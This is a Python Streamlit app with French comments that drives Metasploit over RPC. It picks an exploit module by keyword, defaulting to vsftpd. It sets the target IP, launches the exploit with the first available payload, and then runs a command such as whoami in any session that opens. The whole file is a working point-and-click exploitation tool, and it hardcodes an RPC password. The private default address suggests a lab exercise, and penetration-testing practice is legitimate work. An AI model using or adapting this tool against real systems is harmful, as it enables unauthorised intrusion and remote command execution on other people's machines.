import streamlit as st
from pymetasploit3.msfrpc import MsfRpcClient

# Fonction pour exécuter une commande dans une session
def execute_command(session, cmd):
    session.write(cmd + "\n")
    return session.read()

# Fonction principale
def exploit_and_console():
    st.title("💥 Exploit + Console Metasploit")

    # Formulaire unique
    rhost = st.text_input("🎯 Adresse IP de la cible (ex:192.168.0.111):", value="192.168.0.111", key="target_ip")
    keyword = st.text_input("🔍 Mot-clé de l'exploit (ex:vsftpd):", value="vsftpd", key="exploit_keyword")
    cmd = st.text_input("⌨️ Commande à exécuter après exploitation (ex:whoami):", value="whoami", key="post_exploit_cmd")

    if st.button("🚀 Lancer l'exploit et exécuter la commande"):
        try:
            # Connexion RPC
            client = MsfRpcClient('sondos', port=55553)

            # Chercher exploit par mot-clé
            exploits = client.modules.exploits
            matching_exploits = [name for name in exploits if keyword.lower() in name.lower()]
            if not matching_exploits:
                st.error(f"Aucun exploit trouvé pour '{keyword}'")
                return

            exploit_name = matching_exploits[0]
            exploit_module = client.modules.use('exploit', exploit_name)
            info = client.call('module.info', ['exploit', exploit_name])

            # Configurer options obligatoires
            for opt, opt_info in info['options'].items():
                if opt_info.get('required'):
                    if opt.lower() == "rhosts":
                        exploit_module[opt] = rhost
                    elif opt_info.get('default') is not None:
                        exploit_module[opt] = opt_info['default']

            # Sélectionner un payload
            payload_name = exploit_module.payloads[0]
            payload_module = client.modules.use('payload', payload_name)

            # Lancer l'exploit
            job_id = exploit_module.execute(payload=payload_module)
            st.success(f"[+] Exploit '{exploit_name}' lancé sur {rhost}, Job ID : {job_id}")

            # Vérifier sessions ouvertes
            if not client.sessions.list:
                st.warning("[!] Aucune session ouverte.")
                return

            session_id = list(client.sessions.list.keys())[0]
            session = client.sessions.session(session_id)
            st.info(f"[+] Session {session_id} ouverte.")

            # Exécuter la commande
            output = execute_command(session, cmd)
            if "console_history" not in st.session_state:
                st.session_state.console_history = []
            st.session_state.console_history.append(f"> {cmd}")
            st.session_state.console_history.append(output)

            # Afficher console
            st.text_area("🖥️ Console Metasploit", "\n".join(st.session_state.console_history), height=700)

        except Exception as e:
            st.error(f"Erreur : {e}")

